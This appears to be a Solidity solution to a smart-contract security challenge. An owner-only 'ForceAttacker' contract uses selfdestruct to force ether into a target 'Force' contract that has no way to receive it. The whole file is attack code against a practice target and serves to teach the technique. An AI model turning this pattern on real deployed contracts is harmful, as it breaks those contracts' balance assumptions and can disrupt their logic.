// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Force} from "../Force.sol";

contract ForceAttacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function sendEth(address payable to) public payable onlyOwner {
        selfdestruct(to);
    }
}
